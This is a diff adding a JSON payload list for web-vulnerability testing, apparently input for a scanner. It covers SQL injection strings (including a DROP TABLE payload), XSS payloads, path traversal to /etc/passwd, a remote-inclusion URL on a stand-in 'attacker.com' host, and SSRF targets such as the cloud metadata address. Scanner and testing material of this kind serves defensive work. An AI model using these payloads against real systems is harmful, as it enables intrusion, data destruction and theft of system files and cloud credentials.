@@ -1,0 +1,88 @@
+{
+  "sql_injection": {
+    "patterns": [
+      "' OR '1'='1",
+      "'; DROP TABLE users; --",
+      "\" OR \"1\"=\"1",
+      "admin'--",
+      "' UNION SELECT NULL--"
+    ],
+    "endpoints": [
+      "login",
+      "search",
+      "id",
+      "user",
+      "page"
+    ],
+    "detection_strings": [
+      "SQL syntax error",
+      "mysql_fetch_array",
+      "ORA-01756",
+      "Microsoft OLE DB Provider for ODBC Drivers",
+      "Warning: mysql_"
+    ]
+  },
+  "xss": {
+    "patterns": [
+      "<script>alert('XSS')</script>",
+      "<img src=x onerror=alert('XSS')>",
+      "javascript:alert('XSS')",
+      "<svg onload=alert('XSS')>",
+      "';alert('XSS');//"
+    ],
+    "contexts": [
+      "reflected",
+      "stored",
+      "dom_based"
+    ],
+    "bypass_techniques": [
+      "encoding",
+      "case_variation",
+      "tag_splitting",
+      "event_handlers"
+    ]
+  },
+  "file_inclusion": {
+    "patterns": [
+      "../../../etc/passwd",
+      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "php://filter/convert.base64-encode/resource=",
+      "file:///etc/passwd",
+      "http://attacker.com/shell.txt"
+    ],
+    "types": [
+      "lfi",
+      "rfi"
+    ]
+  },
+  "idor": {
+    "patterns": [
+      "Incrementing user IDs",
+      "Sequential document IDs", 
+      "Predictable object references",
+      "UUID enumeration"
+    ],
+    "locations": [
+      "user profiles",
+      "documents",
+      "orders",
+      "messages",
+      "files"
+    ]
+  },
+  "ssrf": {
+    "patterns": [
+      "http://localhost",
+      "http://127.0.0.1",
+      "http://0.0.0.0",
+      "http://169.254.169.254",
+      "file:///etc/passwd"
+    ],
+    "bypass_techniques": [
+      "IP encoding",
+      "Domain redirects",
+      "Protocol switching",
+      "Port scanning"
+    ]
+  }
+}
